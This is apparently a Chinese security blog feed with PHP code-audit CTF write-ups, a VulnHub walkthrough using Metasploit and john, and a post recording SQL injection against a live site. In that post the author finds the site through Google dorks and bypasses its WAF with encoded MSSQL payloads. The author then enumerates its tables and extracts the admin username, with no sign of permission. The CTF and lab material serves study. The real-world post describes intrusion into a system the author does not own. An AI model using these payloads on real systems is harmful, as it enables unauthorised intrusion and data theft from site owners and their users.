<h2 id="0x17"><a href="#0x17" class="headerlink" title="0x17"></a>0x17</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!$_GET[&#39;id&#39;]) &#123;</span><br><span class="line">	header(&#39;Location:</span><br><span class="line">  index.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;)) </span><br><span class="line">	echo &#39;Hahahahahaha&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;1112 is a nice lab!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4) &#123;</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先看源码 如果没有参数id则自动给id赋值为1 下面多了两个参数 a和b a里面不能带. 下面的data是从a提交的参数当成文件名读取内容 这里应该想到php://input传值 $id==0可以给id传个0a来绕过后面一个正则匹配 要求b第一个为4 但是最后一个要求b第一个不能为4 这里应该想到%00截断 </p>
<p>所以整体就出来了 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0a&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%004111</span><br></pre></td></tr></table></figure>

<p>然后还要再post一个值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1112 is a nice lab</span><br></pre></td></tr></table></figure>

<p>即可得到flag</p>
<h2 id="0x18"><a href="#0x18" class="headerlink" title="0x18"></a>0x18</h2><p><span class="exturl" data-url="aHR0cDovL3dlYi5qYXJ2aXNvai5jb206MzI3Nzgv" title="http://web.jarvisoj.com:32778/">原题链接<i class="fa fa-external-link"></i></span></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">                $auth &#x3D; false;</span><br><span class="line">                $role &#x3D; &quot;guest&quot;;</span><br><span class="line">                $salt &#x3D;</span><br><span class="line">                if (isset($_COOKIE[&quot;role&quot;])) &#123;&#x2F;&#x2F;有cookie</span><br><span class="line">                        $role &#x3D; unserialize($_COOKIE[&quot;role&quot;]);</span><br><span class="line">                        $hsh &#x3D; $_COOKIE[&quot;hsh&quot;];</span><br><span class="line">                        if ($role&#x3D;&#x3D;&#x3D;&quot;admin&quot; &amp;&amp; $hsh &#x3D;&#x3D;&#x3D; md5($salt.strrev($_COOKIE[&quot;role&quot;])))</span><br><span class="line">&#x2F;&#x2F; strrev返回 string 反转后的字符串。 </span><br><span class="line">                         &#123;</span><br><span class="line">                                $auth &#x3D; true; &#x2F;&#x2F;cookie为admin</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                                $auth &#x3D; false; &#x2F;&#x2F;cookie不是admin</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; else &#123;&#x2F;&#x2F;没cookie则设置cookie</span><br><span class="line">                        $s &#x3D; serialize($role);</span><br><span class="line">                        setcookie(&#39;role&#39;,$s);</span><br><span class="line">                        $hsh &#x3D; md5($salt.strrev($s));</span><br><span class="line">                        setcookie(&#39;hsh&#39;,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                if ($auth) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">        ?&gt;      </span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>这里盐值未知 但是后面hsh取md5的时候拼接了盐值 并且role要为admin，hsh也是要用admin翻转拼接salt来计算</p>
<p>所以这里我们需要利用哈希长度扩展攻击来获取flag</p>
<p>但是这里我们也不知道盐值的长度 所以需要先进行爆破来获取盐值长度 再进行哈希长度扩展攻击</p>
<p>首先服务器端返回的是$role=’s:5:”guest”;’<code>以及</code>$hsh=md5(salt+strrev($role))</p>
<p>而我们需要的是md5(salt+strrev(admin))和$role=’s:5:”admin”;’</p>
<p>这里首先爆破盐值长度需要使用hashpumpy </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">for i in range(1,20):</span><br><span class="line">	m&#x3D;hashpumpy.hashpump(&#39;3a4727d57463f122833d9e732f94e4e0&#39;,&#39;;\&quot;tseug\&quot;:5:s&#39;,&#39;;\&quot;nimda\&quot;:5:s&#39;,i)</span><br><span class="line">	print i		</span><br><span class="line">	url&#x3D;&#39;http:&#x2F;&#x2F;120.26.131.152:32778&#x2F;&#39;</span><br><span class="line">	digest&#x3D;m[0]</span><br><span class="line">	</span><br><span class="line">	message&#x3D;urllib.quote(urllib.unquote(m[1])[::-1]) #quote将\x00 变为%00</span><br><span class="line">	cookie&#x3D;&#39;role&#x3D;&#39;+message+&#39;; hsh&#x3D;&#39;+digest #设置新cookie</span><br><span class="line">	#print cookie</span><br><span class="line">	headers&#x3D;&#123;</span><br><span class="line">	&#39;cookie&#39;: cookie,</span><br><span class="line">	&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0&#39;,</span><br><span class="line">	&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">	&#39;Accept-Language&#39;: &#39;:zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&#39;,</span><br><span class="line">	&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;</span><br><span class="line">&#125;</span><br><span class="line">	print headers</span><br><span class="line">	re&#x3D;requests.get(url&#x3D;url,headers&#x3D;headers)</span><br><span class="line">	print re.text</span><br><span class="line">	if &quot;Welcome&quot; in re.text:</span><br><span class="line">		print re;</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

<p>上面是直接运行代码即可获取flag</p>
<p>下面是利用hashpump手工构造payload 然后拿去burpsuite爆破</p>
<p>这里使用hashpump进行填充的时候会得到一个填充后的hash值 填充时的长度就是我们需要进行爆破的</p>
<p>从4到18 然后最后拿去burpsuite爆破 查看返回包 就会得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 4 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 5 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 6 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 7 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 8 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 9 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 10 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 11 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 12 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 13 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 14 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 15 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 16 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 17 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 18 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line"></span><br><span class="line"># %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %88%00%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %90%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %98%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %a0%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %a8%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %b0%00%00%00%00%00%00%00%00</span><br><span class="line"># %b8%00%00%00%00%00%00%00</span><br><span class="line"># %c0%00%00%00%00%00%00</span><br><span class="line"># %c8%00%00%00%00%00</span><br><span class="line"># %d0%00%00%00%00</span><br><span class="line"># %d8%00%00%00</span><br><span class="line"># %e0%00%00</span><br><span class="line"># %e8%00</span><br><span class="line"># %f0</span><br></pre></td></tr></table></figure>

<p>最后可以获取flag的cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;role&quot;: &quot;s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B&quot;, &quot;hsh&quot;: &quot;fcdc3840332555511c4e4323f6decb07&quot;</span><br></pre></td></tr></table></figure>

<p>PS:只有salt在前，value在后，才能进行哈希长度扩展攻击</p>
<h2 id="0x19-反单引号注入"><a href="#0x19-反单引号注入" class="headerlink" title="0x19 反单引号注入"></a>0x19 反单引号注入</h2><p><span class="exturl" data-url="aHR0cDovL3dlYi5qYXJ2aXNvai5jb206MzI3OTQv" title="http://web.jarvisoj.com:32794/">原题链接<i class="fa fa-external-link"></i></span></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table &#x3D; $_GET[&#39;table&#39;]?$_GET[&#39;table&#39;]:&quot;test&quot;;</span><br><span class="line">$table &#x3D; Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc &#96;secret_&#123;$table&#125;&#96;&quot;) or Hacker();</span><br><span class="line">$sql &#x3D; &quot;select &#39;flag&#123;xxx&#125;&#39; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret &#x3D; sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>源码里面可能有两处存在sql注入的地方 </p>
<p>(1)mysqli_query($mysqli,”desc <code>secret_{$table}</code>“)</p>
<p>(2)$sql = “select ‘flag{xxx}’ from secret_{$table}”;</p>
<p>这两处地方第一句用来反引号，百度一下反引号和单引号的区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">desc users xxx; &#x2F;&#x2F; 返回空</span><br><span class="line">desc &#96;users&#96; &#96;xxx&#96;； &#x2F;&#x2F;返回空</span><br><span class="line">desc &#39;users&#39; &#39;xxx&#39;; &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>

<p>举个例子：SELECT <code>select</code> FROM <code>test</code> WHERE select=’字段值’<br>在test表中，有个select字段，如果不用反引号，MYSQL将把select视为保留字而导致出错，所以，有MYSQL保留字作为字段的，必须加上反引号来区分。为了区分MYSQL的保留字与普通字符而引入的符号</p>
<p>建表的时候一般都会将表名，库名都加上反引号来保证语句的执行度</p>
<p>所以按照第一条语句构造注入时要使语句变成desc <code>test</code> <code>union select database()limit1,1</code></p>
<p>要闭合反引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?table&#x3D;test&#96;&#96;union select database() limit 1,1</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(distinct table_name) from information_schema.tables where table_schema&#x3D;database()limit 1,1 &#x2F;&#x2F;这里会有两个表 secret_flag secret_test</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(distinct column_name) from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,1 #有一个字段flagUwillNeverKnow</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1</span><br><span class="line">最后得到flag：flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x1a-利用数组提交绕过逻辑"><a href="#0x1a-利用数组提交绕过逻辑" class="headerlink" title="0x1a 利用数组提交绕过逻辑"></a>0x1a 利用数组提交绕过逻辑</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$role &#x3D; &quot;guest&quot;;</span><br><span class="line">$flag &#x3D; &quot;flag&#123;test_flag&#125;&quot;;</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">if(isset($_COOKIE[&quot;role&quot;]))&#123;</span><br><span class="line">    $role &#x3D; unserialize(base64_decode($_COOKIE[&quot;role&quot;]));</span><br><span class="line">    if($role &#x3D;&#x3D;&#x3D; &quot;admin&quot;)&#123;</span><br><span class="line">        $auth &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $auth &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $role &#x3D; base64_encode(serialize($role));</span><br><span class="line">    setcookie(&#39;role&#39;,$role);</span><br><span class="line">&#125;</span><br><span class="line">if($auth)&#123;</span><br><span class="line">    if(isset($_POST[&#39;filename&#39;]))&#123;</span><br><span class="line">        $filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line">        $data &#x3D; $_POST[&#39;data&#39;];</span><br><span class="line">        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) &#123;</span><br><span class="line">            die(&#39;No No No!&#39;.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $s &#x3D; implode($data);</span><br><span class="line">            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s))&#123;</span><br><span class="line">                $flag&#x3D;&#39;None.&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $rand &#x3D; rand(1,10000000);</span><br><span class="line">            $tmp&#x3D;&quot;.&#x2F;uploads&#x2F;&quot;.md5(time() + $rand).$filename;</span><br><span class="line">            file_put_contents($tmp, $flag);</span><br><span class="line">            echo &quot;your file is in &quot; . $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;</span><br><span class="line">        echo &quot;&lt;br &#x2F;&gt;there are the source.&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        echo &#39;&lt;textarea rows&#x3D;&quot;10&quot; cols&#x3D;&quot;100&quot;&gt;&#39;;</span><br><span class="line">        echo htmlspecialchars(str_replace($flag,&#39;flag&#123;???&#125;&#39;,file_get_contents(__FILE__)));</span><br><span class="line">        echo &#39;&lt;&#x2F;textarea&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Sorry. You have no permissions.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>首先看源码 设置了cookie 不过没有取hash 所以只需要将cookie先反序列化 再base64解码 然后将guest改成admin</p>
<p>然后先base64再序列化，当成新的cookie使用就行</p>
<p>下面代码看出需要POST两个参数 一个filename一个data</p>
<p>filename没有做要求 但是对data做了要求 第一次检查&lt;&gt;是否在里面 在的话直接退出 但是下面又要检查&lt;&gt;在data里面 不在的话$s为空值 flag将会被替换</p>
<p>但是注意到$s是由implode函数转换来的 而implode接受的参数类型是数组 </p>
<p>所以data我们就需要传入一个数组</p>
<p>类似这种:data[0]=999&amp;data[1]=&lt;&gt;</p>
<p>所以思路就出来了 首先将cookie里面的guest改为admin</p>
<p>然后post的两个参数如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;oslo.php&amp;data[0]&#x3D;999&amp;data[1]&#x3D;&lt;&gt;</span><br></pre></td></tr></table></figure>

<p>重放这个包 回显会有提示文件路径 直接访问即可获取flag</p>
<h2 id="Above"><a href="#Above" class="headerlink" title="Above"></a>Above</h2><p>以上都是我这两天学习的一些简单的PHP代码审计 后面应该会进行更高一层次的PHP代码审计学习</p>
<p>这些都是PHP代码里面的一些小特性和一些逻辑绕过，点很小，也不是很综合，都是分开来一个点一个点来学习理解</p>
<p>往后更加努力 能够离大佬的距离越来越近 :D</p>
<p>By oslo</p>
]]></content>
      <categories>
        <category>CodeAudit</category>
        <category>Recording</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入小记录</title>
    <url>/2020/03/22/SQL%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="Sql注入小记录"><a href="#Sql注入小记录" class="headerlink" title="Sql注入小记录"></a>Sql注入小记录</h1><a id="more"></a>

<p>闲着没事想学点东西(gaodianshiqing :D) 就想着直接用google-hacking 直接搜可能存在注入的页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">公司inurl:asp?id&#x3D;  #参数什么的可以自己改 看你自己想象力了</span><br><span class="line">公司inurl:aspx?id&#x3D; </span><br><span class="line">企业inurl:aps?id&#x3D;</span><br><span class="line">学校inurl:asp?id&#x3D;  #etc... 诸如类似的可以自己搜了</span><br></pre></td></tr></table></figure>

<p>然后我随便找了一个 测试单引号 emm？直接给我弹窗error 我还没有遇到这样的</p>
<p>后来学习了一波 这里弹窗是网站程序本身做了过滤 所以直接代码里面就有弹窗的报错代码</p>
<p>这里可以用IIS的%处理机制绕过 将空格和单引号之类的直接url编码一下就行</p>
<p>空格是%0B 单引号是%27之类的</p>
<p>之前不是waf拦截就是跳转一下又回到本页面 都是被做了过滤</p>
<p>这是个怎么情况  那我就想搞搞 菜归菜 但是搞还是要搞</p>
<img data-src="/images/sqlRecord1/1.png" style="zoom:50%;" />

<p>不用单引号 换成其他的试试 直接and 1=1还是直接弹error 然后再试试其他的看是否弹窗</p>
<p>哦豁 直接发现有waf 是个安全狗的waf  然后google安全狗的绕过之类的  一个个测试一下</p>
<img data-src="/images/sqlRecord1/2.png" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;  #拦截弹窗error</span><br><span class="line">&quot;  #未拦截 且有sql报错</span><br><span class="line">and  #拦截弹窗error</span><br><span class="line">&#x2F;**&#x2F; #未拦截</span><br><span class="line">其他的类似union select肯定waf是拦截了的  我就不测试了</span><br><span class="line">网上有很多绕过的写法 我这里就不写了</span><br><span class="line">convert  #未拦截 这个函数可以利用下 ---&gt; convert(int,@@version)</span><br></pre></td></tr></table></figure>

 <img data-src="/images/sqlRecord1/3.png" style="zoom:50%;" />

<p>这里就可以获取很多信息了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@@version：Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64)</span><br><span class="line">Apr  2 2010 15:48:46</span><br><span class="line">Copyright (c) Microsoft Corporation</span><br><span class="line">Express Edition with Advanced Services (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1) (Hypervisor)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_name():dbo</span><br><span class="line">db_name():liu20181127  #其中获取数据库名 括号内加数字可以获取其他数据库名</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">ReportServer$SQLEXPRESS</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>获取了数据库名 就该获取表名了</p>
<p>这里试了其他的安全狗绕过 发现有一个是可以的</p>
<p>这里mssql的注释符有三种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">--</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>

<p>然后结合mssql的注释加换行绕过  构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;--&#x2F;*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b009%0btable_name%0bFROM%0binformation_schema.columns))--%20*&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里用了嵌套子查询 具体怎么用可以学一下sql语句语法什么的</p>
<p>里面的空格换行都用了url编码代替 关于top字句可以了解一下 用于规定返回的记录的数目</p>
<p>这里后面的top用来遍历的 前面的top规定只返回一条记录</p>
<p>这里可以先手工注入一下表名 看看特征什么的 就用上面的那个条payload 后面的top变化时可以注入处不同的表名</p>
<img data-src="/images/sqlRecord1/4.png" style="zoom:50%;" />

<p>可以看到注入出表名了  这后面又学到了一个新姿势 后面可以遍历top后面的数字 用burp来爆破它的表名 然后把结果提取出来就可以了 </p>
<p>将包重放一下 观察一下返回的内容 和我们想要的数据的位置 然后放到爆破模块里面</p>
<p>对payload里面的top后面跟的值进行遍历</p>
<img data-src="/images/sqlRecord1/5.png" style="zoom:50%;" />

<p>在爆破的options里面的 这里添加add 可以从返回的包里面过滤出自己想要的东西</p>
<p>payload选择numbers 从1到500  </p>
<p>结束爆破后 可以点左上角的save 保存为txt文件 只跑出来一点 因为有waf 请求频率过高 做了限制</p>
<img data-src="/images/sqlRecord1/6.png" style="zoom:50%;" />

<p>但还是可以看到有个memberadmin 应该是管理员用户名和密码的表</p>
<p>然后又去找了一下后台看了一下 源码 直接硬猜字段名</p>
<img data-src="/images/sqlRecord1/7.png" style="zoom:50%;" />

<p>可以猜nickname username 密码应该就是password的 都试一下 发现nickname是可以的</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;--&#x2F;*%0a(select%0btop%0b1%0bnickname%0bfrom%0bmemberadmin)--%20*&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里注入出用户名就是admin</p>
<img data-src="/images/sqlRecord1/8.png" style="zoom:50%;" />

<p>然后nickname换成password  发现不行了？？ what？ 页面返回正常？ 没报错</p>
<p>对比一下之前的是转换int出错 而在这里没报错 难道它密码是可以转换成int型 还是密码就是int型</p>
<p>然后改了一下payload 在前面加了一个convert转换成varchar没报错 可以转换 那这里怎么利用呢</p>
<p>自己想着写个tamper放进sqlmap 但是太菜了 sqlmap没有跑出来 就这个密码太奇怪了 </p>
<p>我这操作可太下饭了 :(</p>
<p>后面有空的时候再继续看看 因为想学一下php的代码审计 边写边记录 后面也会放到博客上</p>
<p>By oslo</p>
]]></content>
      <categories>
        <category>SQLinjection</category>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>Recording</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub Walkthrough(二)</title>
    <url>/2020/03/18/VulnHub-Walkthrough-%E4%BA%8C/</url>
    <content><![CDATA[<h1 id="十篇-walkthrough-二"><a href="#十篇-walkthrough-二" class="headerlink" title="十篇 walkthrough(二)"></a>十篇 walkthrough(二)</h1><a id="more"></a>

<h1 id="HF2019-Linux-Walkthrough"><a href="#HF2019-Linux-Walkthrough" class="headerlink" title="HF2019-Linux Walkthrough"></a>HF2019-Linux Walkthrough</h1><p>第一步日常先打开靶机 这次是个Debian64位的靶机 </p>
<p>还是nmap先确定IP 192.168.0.118</p>
<img data-src="/images/vulnhub/HF2019 img/1.png" style="zoom:60%;" />

<p>页面先访问一下  可以看到是个wordpress的站</p>
<img data-src="/images/vulnhub/HF2019 img/2.png" style="zoom:60%;" />

<p>然后日常扫一波端口  看看有没有什么利用点 </p>
<p>这里可以看到靶机开了ftp匿名登录 也可以看到是wp的站和其他文件</p>
<img data-src="/images/vulnhub/HF2019 img/3.png" style="zoom:60%;" />

<p>这里还要一个1000端口开着 开了个http服务</p>
<img data-src="/images/vulnhub/HF2019 img/4.png" style="zoom:60%;" />

<p>先ftp登录一下  ftp登录上去发现只有一堆wp的网站文件 没有其他有用的</p>
<img data-src="/images/vulnhub/HF2019 img/5.png" style="zoom:60%;" />

<p>再看一下1000端口  是个webmin的登录页面  然后google了一下有没有什么利用点</p>
<img data-src="/images/vulnhub/HF2019 img/6.png" style="zoom:60%;" />

<p>发现有一篇文章 是webmin的后门msf利用</p>
<img data-src="/images/vulnhub/HF2019 img/7.png" style="zoom:60%;" />

<p>那就在msf里面跑一边</p>
<img data-src="/images/vulnhub/HF2019 img/8.png" style="zoom:60%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search webmin</span><br><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.118</span><br><span class="line">set lhost 192.168.0.117</span><br><span class="line">set ssl true</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/HF2019 img/9.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/HF2019 img/10.png" style="zoom:60%;" />

<p>这里就直接获取root</p>
<p>之后看了其他人的walkthrough 其实wordpres这里应该也有一个点可以获取root</p>
<p>这里就可以直接用wpscan扫 扫的时候需要一个APIToken 要去wpscan的官网注册免费获取就可以了</p>
<p>扫描结束后发现有个wp的sql注入可以利用 msf里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;admin&#x2F;http&#x2F;wp_google_maps_sqli</span><br><span class="line">msfconsole</span><br><span class="line">search wp_google_maps</span><br><span class="line">use auxiliary&#x2F;admin&#x2F;http&#x2F;wp_google_maps_sqli</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.110</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后发现有个用户 密码需要使用john来爆破 靶机描述里有 需要rockyou.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1</span><br><span class="line">echo &#39;$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1&#39; &gt; pass.txt</span><br><span class="line">john --wordlist&#x3D;&#x2F;root&#x2F;Desktop&#x2F;rockyou.txt pass.txt</span><br></pre></td></tr></table></figure>

<p>爆破密码出来是：kittykat1 用户名是:webmaster</p>
<p>有了用户名和密码  就可以直接用msf里面的wp的exploit来打</p>
<p>msf里面搜索有关于获取shell的exploit</p>
<p>这里使用 最后一个 exploit/unix/webapp/wp_admin_shell_upload</p>
<img data-src="/images/vulnhub/HF2019 img/12.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/HF2019 img/13.png" style="zoom:60%;" />

<p>然后开始提权 先查看sudo权限和可执行文件 这里可以先切换刚才的webmaster用户</p>
<img data-src="/images/vulnhub/HF2019 img/14.png" style="zoom:60%;" />

<p>然后查看权限</p>
<img data-src="/images/vulnhub/HF2019 img/15.png" style="zoom:60%;" />

<p>发现权限为ALL</p>
<p>直接sudo su root</p>
